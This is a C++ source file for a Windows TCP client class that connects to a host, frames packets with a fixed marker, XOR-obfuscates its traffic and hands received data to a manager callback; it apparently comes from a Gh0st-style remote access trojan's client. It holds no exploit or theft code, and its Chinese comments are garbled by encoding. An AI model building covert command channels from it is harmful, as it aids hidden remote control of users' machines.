// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "ClientSocket.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define ZLIB_NO  0001		//���ݰ���ѹ��ģʽ
#define ZLIB_OK  0002		//���ݰ�Ϊѹ��ģʽ

CClientSocket::CClientSocket()
{

		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		
		m_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		m_bIsRunning = false;
		m_Socket = INVALID_SOCKET;
		// Packet Flag;
		//17
		BYTE bPacketFlag[] = {'K', 'B', 'O', 'R', 'A', 'D', 'D', '.', 'L', 'S', 'O', 'V', 'E', '.', 'S', 'E', 'A'};
		memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));

}

CClientSocket::~CClientSocket()
{

	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);

	WSACleanup();

}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{

	// һ��Ҫ���һ�£���Ȼsocket��ľ�ϵͳ��Դ
	Disconnect();

	// �����¼�����
	ResetEvent(m_hEvent);
	m_bIsRunning = false;
	
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}
	
	hostent* pHostent = NULL;
    pHostent = gethostbyname(lpszHost);
	
	if (pHostent == NULL)
	{
		return false;
	}
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return false;
	}
	
    BOOL   bConditionalAccept=TRUE;   
	DWORD  dwBytes;
	// Set KeepAlive �����������, ��ֹ����˲���������

	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 60 * 3; // 3���ӳ�ʱ Keep Alive
		klive.keepaliveinterval = 1000 * 5; // ���Լ��Ϊ5�� Resend if No-Reply
		WSAIoctl(m_Socket, SIO_KEEPALIVE_VALS,&klive,sizeof(tcp_keepalive),NULL,0,&dwBytes,0,NULL);
	}

	m_bIsRunning = TRUE;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return true;
}


DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{	

	CClientSocket *pThis = (CClientSocket *)lparam;

	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{

		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}

		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}	
			if (nSize > 0) 
			{
				MyDecode(buff,nSize);
				pThis->OnRead((LPBYTE)buff, nSize);
			}
		}
	}

	return -1;



}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	PBYTE pData = NULL;
	PBYTE pDeCompressionData = NULL;
	try
	{
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// ���·���	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);
		
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			// Check real Data
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw "bad buffer";
			}
			UINT nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(UINT));
			
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				BOOL nSomp = FALSE;
				m_CompressionBuffer.Read((PBYTE) &nSomp, sizeof(BOOL));   
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				pData = new BYTE[nCompressLength];
				pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
				{
					throw "bad Allocate";
				}
				
				m_CompressionBuffer.Read(pData, nCompressLength);
				
				if(nSomp == ZLIB_NO)  //ֻ����ûѹ������
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pData, nCompressLength);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
								
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch(...)
	{
		if(pData) delete [] pData;
		if(pDeCompressionData) delete [] pDeCompressionData;
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
	
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
	
	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	
	
	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = nSize;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		CopyMemory(pDest,lpData, nSize);
		
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		BOOL nComp = ZLIB_NO;  //��ѹ������
		m_WriteBuffer.Write((PBYTE) &nComp, sizeof(BOOL));         //д�����ݲ�ѹ����־  4 bytes
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);

		delete [] pDest;
		
		// ��������ٱ�������, ��Ϊ�п�����m_ResendWriteBuffer�����ڷ���,���Բ�ֱ��д��
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ���ݷ��͵�����
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // Ҫ���ط�, ֻ����FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ���ݷ��͵�����	
	}
	// �ֿ鷢��
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0xCDEFEDCB74581123;
		data[i] -= 0xBCDFDCC7785D4711;
	}
	return data;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	MyEncode((char *)lpData,nSize);
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	int			i = 0;
	// ���η���
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{

			return -1;
		}
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // ��Ҫ��Sleep,�����������ƶ����ݻ���
	} 
	// �������Ĳ���
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{
			return -1;
		}
		nSend += nRet;
	}


	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::SetManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}
